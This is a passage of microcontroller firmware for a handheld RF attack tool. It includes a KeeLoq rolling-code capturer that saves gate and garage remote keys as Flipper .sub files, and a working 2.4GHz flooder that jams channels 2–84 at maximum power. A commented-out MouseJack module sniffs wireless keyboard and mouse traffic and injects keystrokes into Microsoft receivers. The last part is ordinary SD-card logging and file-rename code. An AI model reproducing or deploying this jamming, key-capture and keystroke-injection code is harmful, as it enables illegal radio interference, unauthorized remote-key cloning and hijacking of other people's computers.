                KeeloqResult res = keeloq_decode_result();
                if (res.valid) {
                    results[resultCount % 4] = res;
                    resultCount++;
                    hasCapture = true;
                    orionLogPrintf("SYS", "KeeLoq: MF=%s Serial=0x%lX Btn=%u Cnt=%u",
                        res.manufacturer,
                        (unsigned long)res.serial,
                        (unsigned)res.btn,
                        (unsigned)res.cnt);
                }
            }
            not_decoded:;
        }

        lastDrawMs = 0;  // force redraw
    }

    // RSSI sample
    if (now - lastRssiMs >= 300) {
        lastRssiMs = now;
        lastRssi   = (int8_t)cc1101ReadRSSI();
    }

    // UP button (normal mode) = save to SD
    static bool upWasPressed = false;
    bool upNow = (companion_readButtonState(BTN_UP) == LOW);
    extern bool rfRollingHoldMode;
    if (upNow && !upWasPressed && !rfRollingHoldMode && hasCapture) {
        upWasPressed = true;
        LOG("RollCapture: attempting SD save");
        if (!validateSDReady(true)) {
            LOG("RollCapture: SD not ready");
            tft.fillRect(0, 270, 240, 14, ILI9341_BLACK);
            tft.setTextSize(1); tft.setTextColor(ILI9341_RED);
            tft.setCursor(8, 272); tft.print("SD not ready - mount SD first");
        } else {
            // Stop CC1101 before SD access (shared SPI)
            cc1101Strobe(CC1101_SIDLE);
            delayMicroseconds(200);
            beginSPIOperation(true);
            SD.mkdir("/captures");
            SD.mkdir("/captures/rf");
            SD.mkdir("/captures/rf/roll_capture");
            char path[52];
            int idx = 0;
            do { snprintf(path, sizeof(path), "/captures/rf/roll_capture/roll%04d.sub", idx++); }
            while (SD.exists(path) && idx < 9999);

            File f = SD.open(path, FILE_WRITE);
            if (f && results) {
                f.println("Filetype: Flipper SubGhz Key File");
                f.println("Version: 1");
                f.printf("Frequency: %lu\n", (unsigned long)(rfLockedFrequencyMHz * 1000000.0f));
                f.println("Preset: FuriHalSubGhzPresetOok650Async");
                f.println("Protocol: KeeLoq");
                int slot = (resultCount - 1) % 4;
                KeeloqResult& r = results[slot];
                uint64_t keyRev = keeloq_reverse_key(r.data, 64);
                f.printf("Key: %02X %02X %02X %02X %02X %02X %02X %02X\n",
                    (uint8_t)(keyRev>>56),(uint8_t)(keyRev>>48),(uint8_t)(keyRev>>40),(uint8_t)(keyRev>>32),
                    (uint8_t)(keyRev>>24),(uint8_t)(keyRev>>16),(uint8_t)(keyRev>>8),(uint8_t)keyRev);
                f.printf("Serial: 0x%07lX\n", (unsigned long)r.serial);
                f.printf("Btn: %d\nCnt: %d\nManufacture: %s\n", r.btn, r.cnt, r.manufacturer);
                if (rawPulses && rawCount > 0) {
                    f.print("RAW_Data:");
                    for (int i = 0; i < rawCount; i++) { f.print(" "); f.print(rawPulses[i]); }
                    f.println();
                }
                f.close();
                endSPIOperation(true, false);
                LOG("RollCapture: saved to " + String(path));
                tft.fillRect(0, 270, 240, 14, ILI9341_BLACK);
                tft.setTextSize(1); tft.setTextColor(ILI9341_GREEN);
                tft.setCursor(8, 272); tft.print("Saved: "); tft.print(path + 28);
            } else {
                if (f) f.close();
                endSPIOperation(true, false);
                LOG("RollCapture: file open failed at " + String(path));
                tft.fillRect(0, 270, 240, 14, ILI9341_BLACK);
                tft.setTextSize(1); tft.setTextColor(ILI9341_RED);
                tft.setCursor(8, 272); tft.print("Save failed - check serial log");
            }
            // Restore CC1101 to RX after SD access
            cc1101ConfigureBase();
            cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
            cc1101EnterRx();
            pinMode(CC1101_GDO0, INPUT);
        }
    }
    if (!upNow) upWasPressed = false;

    // Redraw every 400ms only if something changed
    static uint8_t lastResultCount = 0xFF;
    static int16_t lastRssiDrawn = -128;
    bool needsRedraw = (now - lastDrawMs >= 400 && (resultCount != lastResultCount || abs(lastRssi - lastRssiDrawn) > 3));
    if (!needsRedraw) return;
    lastDrawMs = now;
    lastResultCount = resultCount;
    lastRssiDrawn = lastRssi;

    // Tuner bar
    tft.fillRect(0, 48, 240, 32, ILI9341_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(8, 50);
    tft.print(String(rfLockedFrequencyMHz, 3) + " MHz");
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(160, 50);
    tft.print(String(lastRssi) + " dBm");

    const float fMin = 300.0f, fMax = 928.0f;
    int barX = 8, barW = 224, barY = 62;
    tft.fillRect(barX, barY, barW, 5, tft.color565(40,40,40));
    int mx = barX + (int)((rfLockedFrequencyMHz - fMin) / (fMax - fMin) * barW);
    mx = constrain(mx, barX, barX + barW - 2);
    tft.fillRect(mx - 1, barY - 1, 3, 7, ILI9341_WHITE);
    const float presets[] = {315.0f, 433.92f, 868.35f, 915.0f};
    for (float pr : presets) {
        int tx = barX + (int)((pr - fMin) / (fMax - fMin) * barW);
        tft.drawFastVLine(tx, barY, 5, tft.color565(80,80,80));
    }

    // Results area
    tft.fillRect(0, 72, 240, 202, ILI9341_BLACK);
    tft.setCursor(8, 74);
    tft.setTextColor(tft.color565(120,120,120));
    tft.print("Captures: "); tft.setTextColor(ILI9341_WHITE); tft.print(resultCount);
    tft.setTextColor(tft.color565(120,120,120));
    tft.print("  Raw: "); tft.setTextColor(ILI9341_WHITE); tft.print(rawCount);

    int y = 88;
    int total = min((int)resultCount, 4);
    if (total == 0) {
        tft.setTextColor(tft.color565(70,70,70));
        tft.setCursor(8, 100); tft.print("No KeeLoq decoded yet.");
        tft.setCursor(8, 114); tft.print("Press SELECT, then press remote.");
        tft.setCursor(8, 128); tft.print("Supports: KeeLoq HCS300/200");
        tft.setCursor(8, 142); tft.print("DoorHan, CAME, BFT, Faac...");
    } else {
        for (int p = 0; p < total && y < 270; p++) {
            int slot = (resultCount <= 4) ? p : ((resultCount - total + p) % 4);
            KeeloqResult& r = results[slot];
            tft.setTextColor(tft.color565(100,200,255));
            tft.setCursor(8, y); tft.print("--- #"); tft.print(p+1); tft.print(" ---"); y += 10;
            tft.setTextColor(ILI9341_GREEN);
            tft.setCursor(8, y); tft.print("MF: "); tft.print(r.manufacturer); y += 10;
            tft.setTextColor(ILI9341_WHITE);
            tft.setCursor(8, y); tft.print("Serial: 0x"); tft.print(r.serial, HEX);
            tft.setCursor(130, y); tft.print("Btn:"); tft.print(r.btn); y += 10;
            tft.setCursor(8, y); tft.print("Cnt: "); tft.print(r.cnt);
            tft.setTextColor(ILI9341_YELLOW);
            tft.setCursor(8, y+10); tft.print("Hop: 0x"); tft.print(r.hop, HEX); y += 22;
            tft.drawFastHLine(8, y, 224, tft.color565(40,40,40)); y += 4;
        }
    }
}

// ===== 2.4GHz PACKET FLOODER =====
void runPacketFlooder() {
    static unsigned long lastDisplay = 0;
    static unsigned long startMs     = 0;
    static bool          flooding    = false;
    static uint32_t      lastCount   = 0;
    static uint32_t      pktPerSec   = 0;
    static bool          needsRedraw = true;

    if (attackFirstDraw) {
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 36);
        tft.print("Pkt Flood");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100,100,100));
        tft.setCursor(18, 56);
        tft.print("2.4GHz spectrum saturation");
        tft.drawFastHLine(0, 66, 240, tft.color565(50,50,50));
        tft.setTextColor(tft.color565(120,120,120));
        tft.setCursor(8, 282);
        tft.print("SEL start/stop  LEFT back");

        if (radio1Ok) {
            radio1.setAutoAck(false);
            radio1.stopListening();
            radio1.setPALevel(RF24_PA_MAX);
            radio1.setDataRate(RF24_2MBPS);
            radio1.setPayloadSize(32);
            radio1.setAddressWidth(2);
            radio1.setRetries(0, 0);
            radio1.disableCRC();
            memset(attackPacketBuffer, 0xAA, 32);
        }

        attackChannel     = 2;
        attackPacketsSent = 0;
        flooding          = false;
        startMs           = 0;
        lastDisplay       = 0;
        lastCount         = 0;
        pktPerSec         = 0;
        needsRedraw       = true;
        attackFirstDraw   = false;
    }

    // Handle toggle from input handler
    extern bool packetFlooderToggle;
    if (packetFlooderToggle) {
        packetFlooderToggle = false;
        flooding = !flooding;
        if (flooding) {
            startMs = millis();
            attackPacketsSent = 0;
            lastCount = 0;
            attackChannel = 2;
            if (radio1Ok) { radio1.stopListening(); radio1.setChannel(2); }
        } else {
            if (radio1Ok) radio1.startListening();
        }
        needsRedraw = true;
    }

    if (!radio1Ok) {
        tft.fillRect(18, 80, 204, 20, ILI9341_BLACK);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 82);
        tft.print("Radio 1 not available");
        return;
    }

    // Flood loop — tight burst for 20ms then yield to display
    if (flooding) {
        unsigned long burstEnd = millis() + 20;
        while (millis() < burstEnd) {
            if (!radio1.writeFast(attackPacketBuffer, 32)) {
                radio1.txStandBy();  // flush TX FIFO if full
            }
            attackPacketsSent++;
            attackChannel++;
            if (attackChannel > 84) attackChannel = 2;
            radio1.setChannel(attackChannel);
        }
        radio1.txStandBy();  // ensure last burst is flushed
    }

    // Update display every 500ms
    unsigned long now = millis();
    if (now - lastDisplay < 500 && !needsRedraw) return;
    lastDisplay = now;
    needsRedraw = false;

    unsigned long elapsed = flooding ? max(1UL, (now - startMs) / 1000) : 0;
    if (flooding) {
        pktPerSec = (attackPacketsSent - lastCount) * 2;
        lastCount = attackPacketsSent;
    }

    tft.fillRect(0, 68, 240, 208, ILI9341_BLACK);

    // Status
    tft.setTextSize(2);
    tft.setTextColor(flooding ? ILI9341_RED : tft.color565(80,80,80));
    tft.setCursor(18, 76);
    tft.print(flooding ? "FLOODING" : "IDLE");

    // Packet count
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 104);
    tft.print("Packets sent:");
    tft.setTextSize(2);
    tft.setTextColor(flooding ? ILI9341_YELLOW : tft.color565(80,80,80));
    tft.setCursor(18, 116);
    tft.print(attackPacketsSent);

    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 142);
    tft.print("Rate: ~");
    tft.setTextColor(ILI9341_WHITE);
    tft.print(flooding ? pktPerSec : 0);
    tft.print(" pkt/s");

    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 156);
    tft.print("Channel: ");
    tft.setTextColor(ILI9341_WHITE);
    tft.print(flooding ? (int)attackChannel : 0);
    tft.print(" / 84");

    if (flooding) {
        int barW = (int)((attackChannel / 84.0f) * 224);
        tft.fillRect(8, 172, 224, 8, tft.color565(40,40,40));
        tft.fillRect(8, 172, barW, 8, ILI9341_RED);
    }

    tft.setTextColor(tft.color565(100,100,100));
    tft.setCursor(18, 188);
    if (flooding) {
        tft.print("Running: "); tft.print(elapsed); tft.print("s");
    } else {
        tft.print("Press SELECT to start flooding");
    }
}

// ===== 2.4GHz MOUSE SNIFFER / MOUSEJACK ===== 
// REMOVED - feature disabled to save RAM

/*
const char* getGhzSnifferProfileTitle() {
    switch (ghzSnifferProfile) {
        case GHZ_SNIFFER_HID_WATCH: return "HID Watch";
        case GHZ_SNIFFER_LOGITECH: return "Logitech Sniff";
        case GHZ_SNIFFER_MICROSOFT: return "Microsoft Sniff";
        case GHZ_SNIFFER_GENERIC: return "Generic HID";
        case GHZ_SNIFFER_MOUSEJACK:
        default: return "MouseJack";
    }
}

const char* getGhzSnifferProfileSubtitle() {
    switch (ghzSnifferProfile) {
        case GHZ_SNIFFER_HID_WATCH: return "Live NRF24 keyboard / mouse watch";
        case GHZ_SNIFFER_MOUSEJACK: return "Likely MouseJack targets and inject";
        case GHZ_SNIFFER_LOGITECH: return "Logitech NRF24 HID traffic";
        case GHZ_SNIFFER_MICROSOFT: return "Microsoft NRF24 HID traffic";
        case GHZ_SNIFFER_GENERIC: return "Unknown NRF24 HID payloads";
        default: return "Nearby NRF24 keyboard / mouse hits";
    }
}

const char* getMousejackDeviceTypeLabel(uint8_t type) {
    switch (type) {
        case MOUSEJACK_DEVICE_MICROSOFT: return "Microsoft";
        case MOUSEJACK_DEVICE_LOGITECH: return "Logitech";
        case MOUSEJACK_DEVICE_GENERIC: return "Generic";
        default: return "Unknown";
    }
}

bool mousejackProfileMatches(uint8_t type) {
    switch (ghzSnifferProfile) {
        case GHZ_SNIFFER_HID_WATCH: return type != MOUSEJACK_DEVICE_NONE;
        case GHZ_SNIFFER_MOUSEJACK: return type == MOUSEJACK_DEVICE_MICROSOFT || type == MOUSEJACK_DEVICE_LOGITECH;
        case GHZ_SNIFFER_LOGITECH: return type == MOUSEJACK_DEVICE_LOGITECH;
        case GHZ_SNIFFER_MICROSOFT: return type == MOUSEJACK_DEVICE_MICROSOFT;
        case GHZ_SNIFFER_GENERIC: return type == MOUSEJACK_DEVICE_GENERIC;
        default: return type != MOUSEJACK_DEVICE_NONE;
    }
}

bool looksLikeGenericHidPayload(const uint8_t* payload, uint8_t payloadLength) {
    if (payloadLength < 6 || payloadLength > 22) {
        return false;
    }

    int nonZero = 0;
    int nonFF = 0;
    int transitions = 0;
    uint8_t limit = min((int)payloadLength, 10);
    for (uint8_t i = 0; i < limit; i++) {
        if (payload[i] != 0x00) {
            nonZero++;
        }
        if (payload[i] != 0xFF) {
            nonFF++;
        }
        if (i > 0 && payload[i] != payload[i - 1]) {
            transitions++;
        }
    }

    return nonZero >= 2 && nonFF >= 2 && transitions >= 2;
}

void setMousejackStatus(const char* message, unsigned long holdMs = 1600) {
    strncpy(mousejackStatus, message, sizeof(mousejackStatus) - 1);
    mousejackStatus[sizeof(mousejackStatus) - 1] = 0;
    mousejackStatusUntil = millis() + holdMs;
    sniffListNeedsRedraw = true;
}

void clearMousejackStatusIfExpired() {
    if (mousejackStatus[0] != '\0' && millis() > mousejackStatusUntil) {
        mousejackStatus[0] = '\0';
        mousejackStatusUntil = 0;
        sniffListNeedsRedraw = true;
    }
}

void resetMousejackHits() {
    memset(mousejackHits, 0, sizeof(mousejackHits));
    mousejackHitCount = 0;
    mousejackScanChannel = 2;
    mousejackLastHopMs = 0;
    mousejackNeedsInit = true;
    mousejackLockedChannel = 0;
    mousejackChannelLockUntil = 0;
    sniffSelectedIndex = 0;
    sniffScrollOffset = 0;
    sniffListNeedsRedraw = true;
    mousejackStatus[0] = '\0';
    mousejackStatusUntil = 0;
}

void formatMousejackAddress(const uint8_t* address, char* out, size_t outLen) {
    snprintf(out, outLen, "%02X:%02X:%02X:%02X:%02X",
             address[0], address[1], address[2], address[3], address[4]);
}

int findMousejackHitIndex(const uint8_t* address) {
    for (int i = 0; i < mousejackHitCount; i++) {
        if (memcmp(mousejackHits[i].address, address, 5) == 0) {
            return i;
        }
    }
    return -1;
}

uint8_t detectMousejackDeviceType(const uint8_t* payload, uint8_t payloadLength) {
    if (payloadLength == 19 && payload[0] == 0x08) {
        return MOUSEJACK_DEVICE_MICROSOFT;
    }
    if (payloadLength == 10 && payload[0] == 0x00) {
        return MOUSEJACK_DEVICE_LOGITECH;
    }
    if (looksLikeGenericHidPayload(payload, payloadLength)) {
        return MOUSEJACK_DEVICE_GENERIC;
    }
    return MOUSEJACK_DEVICE_NONE;
}

bool decodeMousejackPacket(const uint8_t* buf, uint8_t* outAddress, uint8_t* outPayload, uint8_t& outPayloadLength, uint8_t& outDeviceType) {
    uint8_t payloadLength = buf[5] >> 2;
    if (payloadLength == 0 || payloadLength > 23) {
        return false;
    }

    uint16_t crc = 0xFFFF;
    for (int x = 0; x < 6 + payloadLength; x++) {
        crc = crc ^ (buf[x] << 8);
        for (int i = 0; i < 8; i++) {
            if ((crc & 0x8000) == 0x8000) {
                crc = (crc << 1) ^ 0x1021;
            } else {
                crc = crc << 1;
            }
        }
    }
    crc = crc ^ (buf[6 + payloadLength] & 0x80 ? 0x8000 : 0);
    crc = (crc << 8) | (crc >> 8);

    uint16_t crcGiven = (buf[6 + payloadLength] << 9) | (buf[7 + payloadLength] << 1);
    crcGiven = (crcGiven << 8) | (crcGiven >> 8);
    if (buf[8 + payloadLength] & 0x80) {
        crcGiven |= 0x100;
    }
    if (crc != crcGiven) {
        return false;
    }

    memcpy(outAddress, buf, 5);
    for (int x = 0; x < payloadLength + 3; x++) {
        outPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
    }

    outPayloadLength = payloadLength;
    outDeviceType = detectMousejackDeviceType(outPayload, outPayloadLength);
    return outDeviceType != MOUSEJACK_DEVICE_NONE;
}

void initMouseSnifferRadio() {
    if (!radio1Ok) {
        return;
    }

    radio1.powerUp();
    delay(6);
    radio1.setAutoAck(false);
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MIN);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setPayloadSize(32);
    radio1.setAddressWidth(2);
    radio1.disableCRC();
    radio1.setChannel(mousejackScanChannel);
    const uint64_t promiscAddr = 0xAALL;
    radio1.openReadingPipe(0, promiscAddr);
    radio1.startListening();
    mousejackNeedsInit = false;
}

void pruneMousejackHits() {
    const uint32_t now = millis();
    const uint32_t staleMs = 16000UL;
    bool removed = false;

    for (int i = 0; i < mousejackHitCount; ) {
        if (now - mousejackHits[i].lastSeenMs > staleMs) {
            for (int j = i; j < mousejackHitCount - 1; j++) {
                mousejackHits[j] = mousejackHits[j + 1];
            }
            mousejackHitCount--;
            removed = true;
            continue;
        }
        i++;
    }

    if (removed) {
        if (sniffSelectedIndex >= mousejackHitCount) {
            sniffSelectedIndex = max(0, mousejackHitCount - 1);
        }
        if (sniffScrollOffset > sniffSelectedIndex) {
            sniffScrollOffset = sniffSelectedIndex;
        }
        sniffListNeedsRedraw = true;
    }
}

void upsertMousejackHit(const uint8_t* address, const uint8_t* payload, uint8_t payloadLength, uint8_t deviceType, uint8_t channel) {
    int idx = findMousejackHitIndex(address);
    if (idx < 0) {
        if (mousejackHitCount >= (int)(sizeof(mousejackHits) / sizeof(mousejackHits[0]))) {
            memmove(&mousejackHits[0], &mousejackHits[1], sizeof(MousejackHit) * (mousejackHitCount - 1));
            mousejackHitCount--;
        }
        idx = mousejackHitCount++;
        memset(&mousejackHits[idx], 0, sizeof(MousejackHit));
        memcpy(mousejackHits[idx].address, address, 5);
    }

    memcpy(mousejackHits[idx].payload, payload, min((int)sizeof(mousejackHits[idx].payload), (int)(payloadLength + 3)));
    mousejackHits[idx].payloadSize = payloadLength;
    mousejackHits[idx].channel = channel;
    mousejackHits[idx].deviceType = deviceType;
    mousejackHits[idx].lastSeenMs = millis();
    mousejackLockedChannel = channel;
    mousejackChannelLockUntil = millis() + 260UL;
    if (mousejackHits[idx].packetCount < 65535) {
        mousejackHits[idx].packetCount++;
    }
    sniffListNeedsRedraw = true;
}

int buildMousejackFilteredIndexes(uint8_t* indexes, int maxCount) {
    int count = 0;
    for (int i = 0; i < mousejackHitCount && count < maxCount; i++) {
        if (!mousejackProfileMatches(mousejackHits[i].deviceType)) {
            continue;
        }
        indexes[count++] = (uint8_t)i;
    }
    return count;
}

bool injectMousejackHit(MousejackHit& hit) {
    if (hit.deviceType != MOUSEJACK_DEVICE_MICROSOFT) {
        setMousejackStatus("Inject only on Microsoft");
        return false;
    }

    radio1.stopListening();
    radio1.setAddressWidth(5);
    radio1.openWritingPipe(hit.address);
    radio1.setAutoAck(true);
    radio1.setPALevel(RF24_PA_MAX);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setPayloadSize(32);
    radio1.setRetries(5, 15);
    radio1.setChannel(hit.channel);
    delay(20);

    uint8_t workPayload[32] = {0};
    memcpy(workPayload, hit.payload, min((int)sizeof(workPayload), (int)(hit.payloadSize + 3)));

    const int keycount = 6;
    for (int i = 0; i < keycount; i++) {
        uint8_t meta = pgm_read_byte(&mousejack_attack[i * 3]);
        uint8_t hid = pgm_read_byte(&mousejack_attack[i * 3 + 1]);

        for (int n = 4; n < hit.payloadSize; n++) {
            workPayload[n] = 0;
        }
        workPayload[6] = 67;
        workPayload[7] = meta;
        workPayload[9] = hid;
        radio1.write(workPayload, hit.payloadSize);
        delay(8);

        workPayload[7] = 0;
        workPayload[9] = 0;
        radio1.write(workPayload, hit.payloadSize);
        delay(8);
    }

    attackPacketsSent += keycount;
    setMousejackStatus("Injected Microsoft keys", 2200);
    initMouseSnifferRadio();
    return true;
}

void focusMousejackHit(MousejackHit& hit) {
    char addr[20];
    formatMousejackAddress(hit.address, addr, sizeof(addr));
    mousejackLockedChannel = hit.channel;
    mousejackChannelLockUntil = millis() + 1400UL;
    radio1.setChannel(hit.channel);

    char status[28];
    snprintf(status, sizeof(status), "%s Ch%u", addr, hit.channel);
    setMousejackStatus(status, 1500);
}

void drawMousejackSnifferList() {
    if (!sniffListNeedsRedraw) {
        return;
    }
    sniffListNeedsRedraw = false;

    static int lastScrollOffset = -1;
    static int lastSelectedIndex = -1;
    static GhzSnifferProfile lastProfile = GHZ_SNIFFER_MOUSEJACK;
    bool fullRedraw = attackFirstDraw ||
                      (lastScrollOffset != sniffScrollOffset) ||
                      (lastSelectedIndex != sniffSelectedIndex) ||
                      (lastProfile != ghzSnifferProfile);
    lastScrollOffset = sniffScrollOffset;
    lastSelectedIndex = sniffSelectedIndex;
    lastProfile = ghzSnifferProfile;

    uint8_t filteredIndexes[sizeof(mousejackHits) / sizeof(mousejackHits[0])] = {0};
    int filteredCount = buildMousejackFilteredIndexes(filteredIndexes, sizeof(filteredIndexes));

    if (sniffSelectedIndex >= filteredCount) {
        sniffSelectedIndex = max(0, filteredCount - 1);
    }
    if (sniffScrollOffset > sniffSelectedIndex) {
        sniffScrollOffset = sniffSelectedIndex;
    }

    const uint16_t accent = tft.color565(100, 200, 255);
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);
    const uint16_t rowSelected = tft.color565(34, 34, 34);
    const int visibleItems = 5;

    if (fullRedraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));
        tft.setTextSize(2);
        tft.setTextColor(accent);
        tft.setCursor(18, 40);
        tft.print(getGhzSnifferProfileTitle());
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print(getGhzSnifferProfileSubtitle());
    }

    tft.fillRoundRect(176, 34, 50, 16, 4, tft.color565(40, 40, 40));
    tft.setTextSize(1);
    tft.setTextColor(accent);
    tft.setCursor(180, 38);
    tft.print(filteredCount);
    if (mousejackLockedChannel != 0 && millis() < mousejackChannelLockUntil) {
        tft.setTextColor(textSoft);
        tft.setCursor(198, 38);
        tft.print("@");
        tft.print(mousejackLockedChannel);
    }

    if (filteredCount == 0) {
        tft.fillRect(8, 78, 224, 176, bg);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 116);
        tft.print("Hopping channels 2-84...");
        tft.setCursor(18, 132);
        tft.print("Looking for NRF24 HID traffic");
    } else {
        for (int i = 0; i < visibleItems; i++) {
            int filteredIndex = i + sniffScrollOffset;
            int y = 78 + i * 34;
            if (filteredIndex >= filteredCount) {
                tft.fillRect(8, y, 224, 30, bg);
                continue;
            }

            MousejackHit& hit = mousejackHits[filteredIndexes[filteredIndex]];
            bool selected = (filteredIndex == sniffSelectedIndex);
            char addr[20];
            formatMousejackAddress(hit.address, addr, sizeof(addr));

            tft.fillRoundRect(8, y, 224, 28, 4, selected ? rowSelected : rowFill);
            drawListSelectionFrame(8, y, 224, 28, selected, accent);

            tft.setTextSize(1);
            tft.setTextColor(accent);
            tft.setCursor(14, y + 4);
            tft.print(getMousejackDeviceTypeLabel(hit.deviceType));

            tft.setTextColor(textSoft);
            tft.setCursor(164, y + 4);
            tft.print("Ch");
            tft.print(hit.channel);

            tft.setTextColor(ILI9341_WHITE);
            tft.setCursor(14, y + 16);
            tft.print(addr);

            tft.setTextColor(textSoft);
            tft.setCursor(154, y + 16);
            tft.print("Pk ");
            tft.print(hit.packetCount);
        }
    }

    tft.fillRect(12, 268, 216, 24, bg);
    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(12, 272);
    tft.print("UP/DN select  LEFT back");
    tft.setCursor(12, 284);
    if (mousejackStatus[0] != '\0') {
        tft.setTextColor(accent);
        tft.print(mousejackStatus);
    } else if (filteredCount > 0) {
        MousejackHit& selectedHit = mousejackHits[filteredIndexes[sniffSelectedIndex]];
        if (ghzSnifferProfile == GHZ_SNIFFER_MOUSEJACK && selectedHit.deviceType == MOUSEJACK_DEVICE_MICROSOFT) {
            tft.print("SEL inject test payload");
        } else {
            tft.print("SEL lock on selected channel");
        }
    } else {
        tft.print("Live NRF24 HID watcher");
    }
}

void runMouseSniffer() {
    if (attackFirstDraw) {
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        resetMousejackHits();
        attackPacketsSent = 0;
        sniffSelectedIndex = 0;
        sniffScrollOffset = 0;
        sniffListNeedsRedraw = true;
    }

    if (!radio1Ok) {
        drawRFUnavailable(getGhzSnifferProfileTitle(), getGhzSnifferProfileSubtitle());
        delay(80);
        return;
    }

    if (mousejackNeedsInit) {
        initMouseSnifferRadio();
        setMousejackStatus("Listening on NRF24 HID", 1200);
    }

    clearMousejackStatusIfExpired();

    bool channelLocked = mousejackLockedChannel != 0 && millis() < mousejackChannelLockUntil;
    if (!channelLocked && millis() - mousejackLastHopMs >= 90UL) {
        mousejackLastHopMs = millis();
        mousejackScanChannel++;
        if (mousejackScanChannel > 84) {
            mousejackScanChannel = 2;
        }
        radio1.setChannel(mousejackScanChannel);
        sniffListNeedsRedraw = true;
    } else if (channelLocked && mousejackScanChannel != mousejackLockedChannel) {
        mousejackScanChannel = mousejackLockedChannel;
        radio1.setChannel(mousejackScanChannel);
        sniffListNeedsRedraw = true;
    }

    for (int reads = 0; reads < 6 && radio1.available(); reads++) {
        uint8_t buf[32];
        uint8_t address[5];
        uint8_t payload[32] = {0};
        uint8_t payloadLength = 0;
        uint8_t deviceType = MOUSEJACK_DEVICE_NONE;
        radio1.read(&buf, sizeof(buf));

        if (!decodeMousejackPacket(buf, address, payload, payloadLength, deviceType)) {
            continue;
        }
        if (!mousejackProfileMatches(deviceType)) {
            if (ghzSnifferProfile == GHZ_SNIFFER_MOUSEJACK) {
                continue;
            }
        }
        upsertMousejackHit(address, payload, payloadLength, deviceType, mousejackScanChannel);
    }

    pruneMousejackHits();

    int filteredCount = 0;
    uint8_t filteredIndexes[sizeof(mousejackHits) / sizeof(mousejackHits[0])] = {0};
    filteredCount = buildMousejackFilteredIndexes(filteredIndexes, sizeof(filteredIndexes));
    handleSniffListInput(filteredCount);

    if (filteredCount > 0 && pressedOnce(BTN_SELECT)) {
        MousejackHit& selectedHit = mousejackHits[filteredIndexes[sniffSelectedIndex]];
        if (ghzSnifferProfile == GHZ_SNIFFER_MOUSEJACK && selectedHit.deviceType == MOUSEJACK_DEVICE_MICROSOFT) {
            injectMousejackHit(selectedHit);
        } else {
            focusMousejackHit(selectedHit);
        }
    }

    drawMousejackSnifferList();
    
    // Set attackFirstDraw to false AFTER the first draw
    if (attackFirstDraw) {
        attackFirstDraw = false;
    }
}

void stopMouseSniffer() {
    radio1.stopListening();
    radio1.setAutoAck(false);
    radio1.setRetries(0, 0);
    radio1.setAddressWidth(5);
    mousejackNeedsInit = true;
    mousejackLockedChannel = 0;
    mousejackChannelLockUntil = 0;
}
*/

// ===== LOGGING =====
// ===== LOGGING =====
void logToSD(String message) {
    if (!validateSDReady(false)) return;

    beginSPIOperation(true);
    File file = SD.open("/logs/system.log", FILE_APPEND);
    if (!file) {
        LOG("Log open failed");
        endSPIOperation(true, false);
        return;
    }

    file.println(message);
    file.close();
    endSPIOperation(false);

    LOG("Logged: " + message);
}

const char** getFileRenameKeyArray() {
    return fileRenameUppercase ? fileRenameKeysUpper : fileRenameKeysLower;
}

bool isFileRenameKeySelectable(int index) {
    if (index < 0 || index >= fileRenameKeyCount) {
        return false;
    }
    const char* label = getFileRenameKeyArray()[index];
    return label != nullptr && label[0] != '\0';
}

int moveFileRenameSelection(int currentIndex, int delta, bool horizontal) {
    int nextIndex = currentIndex;
    while (true) {
        int candidate = nextIndex + delta;
        if (candidate < 0 || candidate >= fileRenameKeyCount) {
            return currentIndex;
        }
        if (horizontal && (candidate / fileRenameKeyCols) != (nextIndex / fileRenameKeyCols)) {
            return currentIndex;
        }
        nextIndex = candidate;
        if (isFileRenameKeySelectable(nextIndex)) {
            return nextIndex;
        }
    }
}

bool commitFileRename() {
    String renamedLeaf = fileRenameDraft;
    renamedLeaf.trim();
    if (renamedLeaf.length() == 0) {
        fileRenameStatus = "Name required";
        fileRenameStatusUntil = millis() + 1200;
        redrawFileRenameDraftArea();
        return false;
    }

    renamedLeaf += fileRenameExtension;
    String parentPath = getFileManagerParentPath(fileRenamePath);
    if (parentPath.length() == 0) parentPath = "/";
    String newPath = (parentPath == "/") ? ("/" + renamedLeaf) : (parentPath + "/" + renamedLeaf);

    if (renameSDEntry(fileRenamePath, renamedLeaf)) {
        fileDetailPath = newPath;
        fileDetailSavedText = getSDEntrySavedText(newPath);
        fileRenamePath = newPath;
        loadFileManagerEntries();
        int newIndex = findFileManagerIndexByPath(newPath);
        if (newIndex >= 0) {
            fileManagerSelectedIndex = newIndex;
        }
        currentScreen = SCREEN_FILE_DETAIL;
        drawFileDetailScreen();
        return true;
    }

    fileRenameStatus = "Rename failed";
    fileRenameStatusUntil = millis() + 1200;
    redrawFileRenameDraftArea();
    return false;
}

bool isTextFilePath(const String& path) {
    String lowerPath = path;
    lowerPath.toLowerCase();
    return lowerPath.endsWith(".txt") || lowerPath.endsWith(".csv") || lowerPath.endsWith(".log");
}

int countWrappedTextViewerLines(const String& text, int maxCharsPerLine) {
    if (text.length() == 0) {
        return 1;
    }

    int lineCount = 1;
    int lineLen = 0;

    for (size_t i = 0; i < text.length(); i++) {
        char c = text[i];
        if (c == '\n') {
            lineCount++;
            lineLen = 0;
            continue;
        }

        lineLen++;
